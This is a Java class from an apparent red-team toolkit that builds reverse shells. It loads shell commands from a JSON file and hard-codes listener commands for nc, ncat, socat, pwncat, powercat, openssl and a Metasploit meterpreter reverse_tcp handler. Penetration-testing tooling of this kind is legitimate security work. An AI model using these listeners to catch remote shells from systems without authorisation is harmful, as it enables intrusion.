package ffffffff0x.beryenigma.App.Controller.Tools.RedTeam.ReverseShellGenerator;

import com.google.gson.Gson;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;
import java.util.stream.Collectors;

/**
 * @author: RyuZUSUNC
 * @create: 2021-09-23 16:57
 **/

public class RedTeam_ReverseShellGenerator {
    private Map<String,String> ListenerType = new HashMap<>();
    private ReverseShellBeans reverseShellBeans;

    public RedTeam_ReverseShellGenerator() {
        initListenerType();
        String jsonData = new BufferedReader(new InputStreamReader(RedTeam_ReverseShellGenerator.class.getResourceAsStream("/redTeam/ReverseShell.json")))
                .lines().collect(Collectors.joining(System.lineSeparator()));
        Gson gson = new Gson();
        reverseShellBeans = gson.fromJson(jsonData, ReverseShellBeans.class);
    }

    public ReverseShellBeans getReverseShellBeans() {
        return reverseShellBeans;
    }
    
    public String getReverseShell(String shellType) {
        for (ReverseShellBeans.ReverseShellBean datum : reverseShellBeans.getData()) {
            if (datum.getName().equals(shellType)) {
                return datum.getCommand();
            }
        }
        return null;
    }

    public String getListener(String listenerType) {
        return ListenerType.get(listenerType);
    }

    public void initListenerType() {
        ListenerType.put("nc", "nc -lvnp {port}");
        ListenerType.put("ncat", "ncat -lvnp {port}");
        ListenerType.put("ncat (TLS)", "ncat --ssl -lvnp {port}");
        ListenerType.put("rlwrap + nc", "rlwrap -cAr nc -lvnp {port}");
        ListenerType.put("rc", "rc -lp {port}");
        ListenerType.put("rc + Command History", "rc -lHp {port}");
        ListenerType.put("pwncat", "python3 -m pwncat -lp {port}");
        ListenerType.put("windows ConPty", "stty raw -echo; (stty size; cat) | nc -lvnp {port}");
        ListenerType.put("socat", "socat -d -d TCP-LISTEN:{port} STDOUT");
        ListenerType.put("socat (TTY)", "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}");
        ListenerType.put("powercat", "powercat -l -p {port}");
        ListenerType.put("msfconsole", "msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {ip}; set lport {port}; exploit\"");
        ListenerType.put("Openssl", "openssl s_server -quiet -key key.pem -cert cert.pem -port {port}");
    }
}
